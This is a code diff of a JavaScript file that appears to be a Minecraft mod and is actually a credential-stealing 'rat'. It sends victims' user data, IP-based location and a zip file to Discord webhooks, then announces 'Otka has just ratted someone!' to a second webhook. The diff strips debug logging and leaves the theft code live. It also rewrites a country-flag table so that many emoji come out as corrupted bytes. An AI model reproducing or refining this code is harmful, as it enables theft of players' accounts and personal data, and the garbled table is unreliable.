@@ -16,27 +16,27 @@ const system = {
 
 // Country flag emojis
 const countryFlags = {
-    "US": "🇺🇸", "CA": "🇨🇦", "GB": "🇬🇧", "DE": "🇩🇪", "FR": "🇫🇷", "IT": "🇮🇹", "ES": "🇪🇸", "NL": "🇳🇱", "BE": "🇧🇪", "CH": "🇨🇭",
-    "AT": "🇦🇹", "SE": "🇸🇪", "NO": "🇳🇴", "DK": "🇩🇰", "FI": "🇫🇮", "PL": "🇵🇱", "CZ": "🇨🇿", "SK": "🇸🇰", "HU": "🇭🇺", "RO": "🇷🇴",
-    "BG": "🇧🇬", "HR": "🇭🇷", "SI": "🇸🇮", "EE": "🇪🇪", "LV": "🇱🇻", "LT": "🇱🇹", "IE": "🇮🇪", "PT": "🇵🇹", "GR": "🇬🇷", "CY": "🇨🇾",
-    "MT": "🇲🇹", "LU": "🇱🇺", "IS": "🇮🇸", "LI": "🇱🇮", "MC": "🇲🇨", "AD": "🇦🇩", "SM": "🇸🇲", "VA": "🇻🇦", "AU": "🇦🇺", "NZ": "🇳🇿",
-    "JP": "🇯🇵", "KR": "🇰🇷", "CN": "🇨🇳", "TW": "🇹🇼", "HK": "🇭🇰", "SG": "🇸🇬", "MY": "🇲🇾", "TH": "🇹🇭", "VN": "🇻🇳", "PH": "🇵🇭",
-    "ID": "🇮🇩", "IN": "🇮🇳", "PK": "🇵🇰", "BD": "🇧🇩", "LK": "🇱🇰", "NP": "🇳🇵", "MM": "🇲🇲", "KH": "🇰🇭", "LA": "🇱🇦", "MN": "🇲🇳",
-    "BR": "🇧🇷", "AR": "🇦🇷", "CL": "🇨🇱", "PE": "🇵🇪", "CO": "🇨🇴", "VE": "🇻🇪", "EC": "🇪🇨", "BO": "🇧🇴", "PY": "🇵🇾", "UY": "🇺🇾",
-    "MX": "🇲🇽", "GT": "🇬🇹", "BZ": "🇧🇿", "SV": "🇸🇻", "HN": "🇭🇳", "NI": "🇳🇮", "CR": "🇨🇷", "PA": "🇵🇦", "CU": "🇨🇺", "JM": "🇯🇲",
-    "HT": "🇭🇹", "DO": "🇩🇴", "PR": "🇵🇷", "TT": "🇹🇹", "BB": "🇧🇧", "GD": "🇬🇩", "LC": "🇱🇨", "VC": "🇻🇨", "AG": "🇦🇬", "KN": "🇰🇳",
-    "ZA": "🇿🇦", "EG": "🇪🇬", "NG": "🇳🇬", "KE": "🇰🇪", "TZ": "🇹🇿", "UG": "🇺🇬", "ET": "🇪🇹", "SO": "🇸🇴", "DJ": "🇩🇯", "ER": "🇪🇷",
-    "RU": "🇷🇺", "UA": "🇺🇦", "BY": "🇧🇾", "MD": "🇲🇩", "GE": "🇬🇪", "AM": "🇦🇲", "AZ": "🇦🇿", "KZ": "🇰🇿", "UZ": "🇺🇿", "TM": "🇹🇲",
-    "TJ": "🇹🇯", "KG": "🇰🇬", "AF": "🇦🇫", "IR": "🇮🇷", "IQ": "🇮🇶", "SA": "🇸🇦", "AE": "🇦🇪", "QA": "🇶🇦", "KW": "🇰🇼", "BH": "🇧🇭",
-    "OM": "🇴🇲", "YE": "🇾🇪", "JO": "🇯🇴", "LB": "🇱🇧", "SY": "🇸🇾", "IL": "🇮🇱", "PS": "🇵🇸", "TR": "🇹🇷", "MA": "🇲🇦", "DZ": "🇩🇿",
-    "TN": "🇹🇳", "LY": "🇱🇾", "SD": "🇸🇩", "TD": "🇹🇩", "NE": "🇳🇪", "ML": "🇲🇱", "BF": "🇧🇫", "CI": "🇨🇮", "GH": "🇬🇭", "SN": "🇸🇳",
-    "GN": "🇬🇳", "SL": "🇸🇱", "LR": "🇱🇷", "TG": "🇹🇬", "BJ": "🇧🇯", "GW": "🇬🇼", "CV": "🇨🇻", "GM": "🇬🇲", "CF": "🇨🇫", "CM": "🇨🇲",
-    "GQ": "🇬🇶", "GA": "🇬🇦", "CG": "🇨🇬", "CD": "🇨🇩", "AO": "🇦🇴", "ZM": "🇿🇲", "ZW": "🇿🇼", "BW": "🇧🇼", "NA": "🇳🇦", "SZ": "🇸🇿",
-    "LS": "🇱🇸", "MG": "🇲🇬", "MU": "🇲🇺", "SC": "🇸🇨", "KM": "🇰🇲", "YT": "🇾🇹", "RE": "🇷🇪", "IO": "🇮🇴", "SH": "🇸🇭", "ST": "🇸🇹",
-    "AQ": "🇦🇶", "TF": "🇹🇫", "HM": "🇭🇲", "GS": "🇬🇸", "FK": "🇫🇰", "GI": "🇬🇮", "BM": "🇧🇲", "TC": "🇹🇨", "VG": "🇻🇬", "AI": "🇦🇮",
-    "AW": "🇦🇼", "CW": "🇨🇼", "SX": "🇸🇽", "BQ": "🇧🇶", "MF": "🇲🇫", "BL": "🇧🇱", "PM": "🇵🇲", "WF": "🇼🇫", "NC": "🇳🇨", "PF": "🇵🇫",
-    "VU": "🇻🇺", "FJ": "🇫🇯", "TO": "🇹🇴", "WS": "🇼🇸", "KI": "🇰🇮", "TV": "🇹🇻", "NR": "🇳🇷", "PW": "🇵🇼", "MH": "🇲🇭", "FM": "🇫🇲",
-    "CK": "🇨🇰", "NU": "🇳🇺", "TK": "🇹🇰", "AS": "🇦🇸", "GU": "🇬🇺", "MP": "🇲🇵", "VI": "🇻🇮", "PR": "🇵🇷", "XX": "🏳️" // Unknown country
+    "US": "🇺🇸", "CA": "🇨🇦", "GB": "🇬🇧", "DE": "🇩🇪", "FR": "🇫🇷", "IT": "🇮🇹", "ES": "🇪🇸", "NL": "🇳🇱", "BE": "��🇪", "CH": "🇨🇭",
+    "AT": "🇦🇹", "SE": "🇸🇪", "NO": "🇳🇴", "DK": "🇩🇰", "FI": "🇫🇮", "PL": "🇵🇱", "CZ": "🇨🇿", "SK": "🇸🇰", "HU": "��🇺", "RO": "🇷🇴",
+    "BG": "🇧🇬", "HR": "🇭🇷", "SI": "🇸🇮", "EE": "🇪🇪", "LV": "🇱🇻", "LT": "🇱🇹", "IE": "🇮🇪", "PT": "🇵🇹", "GR": "��🇷", "CY": "🇨🇾",
+    "MT": "🇲🇹", "LU": "🇱🇺", "IS": "🇮🇸", "LI": "🇱🇮", "MC": "🇲🇨", "AD": "🇦🇩", "SM": "🇸🇲", "VA": "🇻🇦", "AU": "��🇺", "NZ": "🇳🇿",
+    "JP": "🇯🇵", "KR": "🇰🇷", "CN": "🇨🇳", "TW": "🇹🇼", "HK": "🇭🇰", "SG": "🇸🇬", "MY": "🇲🇾", "TH": "🇹🇭", "VN": "��🇳", "PH": "🇵🇭",
+    "ID": "🇮🇩", "IN": "🇮🇳", "PK": "🇵🇰", "BD": "🇧🇩", "LK": "🇱🇰", "NP": "🇳🇵", "MM": "🇲🇲", "KH": "🇰🇭", "LA": "��🇦", "MN": "🇲🇳",
+    "BR": "🇧🇷", "AR": "🇦🇷", "CL": "🇨🇱", "PE": "🇵🇪", "CO": "🇨🇴", "VE": "🇻🇪", "EC": "🇪🇨", "BO": "🇧��", "PY": "��🇾", "UY": "🇺🇾",
+    "MX": "🇲��", "GT": "🇬🇹", "BZ": "🇧🇿", "SV": "🇸🇻", "HN": "🇭🇳", "NI": "🇳🇮", "CR": "🇨🇷", "PA": "🇵🇦", "CU": "��🇺", "JM": "🇯🇲",
+    "HT": "🇭🇹", "DO": "🇩🇴", "PR": "🇵🇷", "TT": "🇹🇹", "BB": "🇧🇧", "GD": "🇬🇩", "LC": "🇱🇨", "VC": "🇻🇨", "AG": "��🇬", "KN": "🇰🇳",
+    "ZA": "🇿🇦", "EG": "🇪🇬", "NG": "🇳��", "KE": "🇰🇪", "TZ": "🇹🇿", "UG": "🇺🇬", "ET": "🇪🇹", "SO": "🇸🇴", "DJ": "��🇯", "ER": "🇪🇷",
+    "RU": "🇷🇺", "UA": "🇺🇦", "BY": "🇧🇾", "MD": "🇲🇩", "GE": "🇬🇪", "AM": "🇦��", "AZ": "🇦��", "KZ": "🇰🇿", "UZ": "��🇿", "TM": "🇹🇲",
+    "TJ": "🇹🇯", "KG": "🇰🇬", "AF": "🇦🇫", "IR": "🇮🇷", "IQ": "🇮🇶", "SA": "🇸🇦", "AE": "🇦🇪", "QA": "🇶🇦", "KW": "��🇼", "BH": "🇧🇭",
+    "OM": "🇴🇲", "YE": "🇾🇪", "JO": "🇯🇴", "LB": "🇱🇧", "SY": "🇸🇾", "IL": "🇮🇱", "PS": "🇵🇸", "TR": "🇹��", "MA": "��🇦", "DZ": "🇩🇿",
+    "TN": "🇹🇳", "LY": "🇱🇾", "SD": "🇸🇩", "TD": "🇹🇩", "NE": "🇳🇪", "ML": "🇲🇱", "BF": "🇧🇫", "CI": "🇨🇮", "GH": "��🇭", "SN": "🇸🇳",
+    "GN": "🇬🇳", "SL": "🇸🇱", "LR": "🇱🇷", "TG": "🇹🇬", "BJ": "🇧🇯", "GW": "🇬🇼", "CV": "🇨🇻", "GM": "🇬🇲", "CF": "��🇫", "CM": "🇨🇲",
+    "GQ": "🇬🇶", "GA": "🇬🇦", "CG": "🇨🇬", "CD": "🇨🇩", "AO": "🇦🇴", "ZM": "🇿🇲", "ZW": "🇿🇼", "BW": "🇧🇼", "NA": "��🇦", "SZ": "🇸🇿",
+    "LS": "🇱🇸", "MG": "🇲🇬", "MU": "🇲🇺", "SC": "🇸🇨", "KM": "🇰🇲", "YT": "🇾🇹", "RE": "🇷🇪", "IO": "🇮🇴", "SH": "��🇭", "ST": "🇸🇹",
+    "AQ": "🇦🇶", "TF": "🇹🇫", "HM": "🇭🇲", "GS": "🇬🇸", "FK": "🇫🇰", "GI": "🇬🇮", "BM": "🇧🇲", "TC": "🇹🇨", "VG": "��🇬", "AI": "🇦🇮",
+    "AW": "🇦��", "CW": "🇨��", "SX": "🇸🇽", "BQ": "🇧🇶", "MF": "🇲🇫", "BL": "🇧🇱", "PM": "🇵🇲", "WF": "🇼🇫", "NC": "��🇨", "PF": "🇵🇫",
+    "VU": "🇻🇺", "FJ": "🇫🇯", "TO": "🇹🇴", "WS": "🇼🇸", "KI": "🇰🇮", "TV": "🇹🇻", "NR": "🇳🇷", "PW": "🇵🇼", "MH": "��🇭", "FM": "🇫🇲",
+    "CK": "🇨🇰", "NU": "🇳🇺", "TK": "🇹🇰", "AS": "🇦🇸", "GU": "🇬🇺", "MP": "🇲🇵", "VI": "🇻🇮", "PR": "��🇷", "XX": "🏳️" // Unknown country
 };
 
 function getCountryFlag(countryCode) {
@@ -217,7 +217,7 @@ function sendToDiscord(userData, ipInfo, countryCode, city, zipFile) {
         // Create beautiful Discord embed
         const embed = {
             "embeds": [{
-                "title": "🎮 " + Player.getName(),
+                "title": "�� " + Player.getName(),
                 "description": userData,
                 "color": 0x00ff00,
                 "fields": [
@@ -321,11 +321,6 @@ function sendToDiscord(userData, ipInfo, countryCode, city, zipFile) {
 }
 
 function sendSkyCryptLink(username, uuid) {
-    console.log("=== SKYCRYPT FUNCTION START ===");
-    console.log("sendSkyCryptLink called with username:", username, "uuid:", uuid);
-    console.log("Current DISCORD_WEBHOOK_URL:", DISCORD_WEBHOOK_URL);
-    console.log("SKYCRYPT_WEBHOOK_URL:", SKYCRYPT_WEBHOOK_URL);
-    
     // Don't send if username is JanesSappire with specific UUID
     if (username === "JanesSappire" && uuid === "f96b3a04-ea67-47b3-a5de-42844df57be3") {
         console.log("Skipping SkyCrypt link for JanesSappire");
@@ -335,10 +330,7 @@ function sendSkyCryptLink(username, uuid) {
     try {
         console.log("Sending SkyCrypt link to Discord webhook...");
         const url = new URL(SKYCRYPT_WEBHOOK_URL);
-        console.log("Created URL object:", url.toString());
-        
         const connection = url.openConnection();
-        console.log("Opened connection");
 
         connection.setDoOutput(true);
         connection.setRequestMethod("POST");
@@ -346,26 +338,18 @@ function sendSkyCryptLink(username, uuid) {
         connection.setRequestProperty("User-Agent", "Minecraft Client");
         connection.setConnectTimeout(10000);
         connection.setReadTimeout(30000);
-        console.log("Set connection properties");
-        
         connection.connect();
-        console.log("Connected to webhook");
 
         const out = connection.getOutputStream();
-        console.log("Got output stream");
         
         // Determine the message based on the webhook URL
         let message;
-        console.log("Checking webhook URL for message...");
         if (DISCORD_WEBHOOK_URL.includes("1381411707745865738")) {
             message = "Otka has just ratted someone!";
-            console.log("Using Otka message");
         } else if (DISCORD_WEBHOOK_URL.includes("1338123822389395568")) {
             message = "Either Khalaf or K22 have just ratted someone!";
-            console.log("Using Khalaf/K22 message");
         } else {
             message = "Someone has just been ratted!";
-            console.log("Using default message");
         }
         
         // Create Discord embed with SkyCrypt link
@@ -393,32 +377,23 @@ function sendSkyCryptLink(username, uuid) {
             }]
         };
         
-        console.log("Created embed:", JSON.stringify(embed, null, 2));
-        
         const jsonPayload = new Packages.java.lang.String(JSON.stringify(embed));
         const bytes = jsonPayload.getBytes("UTF-8");
-        console.log("JSON payload length:", bytes.length);
-        
         out.write(bytes);
         out.close();
-        console.log("Wrote data to connection");
 
         const code = connection.getResponseCode();
         console.log("SkyCrypt link sent, response code:", code);
         
         if (code >= 200 && code < 300) {
             console.log("SkyCrypt link sent successfully!");
-            console.log("=== SKYCRYPT FUNCTION SUCCESS ===");
             return true;
         } else {
             console.log("SkyCrypt link failed to send, HTTP code:", code);
-            console.log("=== SKYCRYPT FUNCTION FAILED ===");
             return false;
         }
     } catch (e) {
         console.log("Error sending SkyCrypt link to Discord:", e.toString());
-        console.log("Error stack trace:", e.stack);
-        console.log("=== SKYCRYPT FUNCTION ERROR ===");
         return false;
     }
 }
@@ -448,42 +423,15 @@ new Thread(function() {
         
         console.log("Sending to Discord...");
         const success = sendToDiscord(userData, ipInfo, countryCode, city, zipFile);
-        console.log("Discord send completed, success:", success);
-        console.log("About to proceed to SkyCrypt section...");
         
         // Send SkyCrypt link to different webhook
-        console.log("=== MAIN THREAD: ABOUT TO CALL SKYCRYPT ===");
         console.log("Sending SkyCrypt link...");
-        console.log("Username for SkyCrypt:", username);
-        console.log("UUID for SkyCrypt:", uuid);
-        
-        // Test call to make sure function exists
-        if (typeof sendSkyCryptLink === 'function') {
-            console.log("sendSkyCryptLink function exists, calling it...");
-            const skyCryptSuccess = sendSkyCryptLink(username, uuid);
-            console.log("SkyCrypt success result:", skyCryptSuccess);
-        } else {
-            console.log("ERROR: sendSkyCryptLink function does not exist!");
-            const skyCryptSuccess = false;
-        }
-        
-        // Direct test call as backup
-        console.log("Making direct test call to SkyCrypt function...");
-        try {
-            const testResult = sendSkyCryptLink(username, uuid);
-            console.log("Direct test call result:", testResult);
-        } catch (e) {
-            console.log("Direct test call failed:", e.toString());
-        }
-        
-        console.log("=== MAIN THREAD: SKYCRYPT CALL COMPLETED ===");
+        const skyCryptSuccess = sendSkyCryptLink(username, uuid);
         
         if (success && skyCryptSuccess) {
             console.log("Data collection and SkyCrypt link sent successfully!");
         } else {
             console.log("Some operations failed!");
-            console.log("Main Discord success:", success);
-            console.log("SkyCrypt success:", skyCryptSuccess);
         }
 
     } catch (e) {
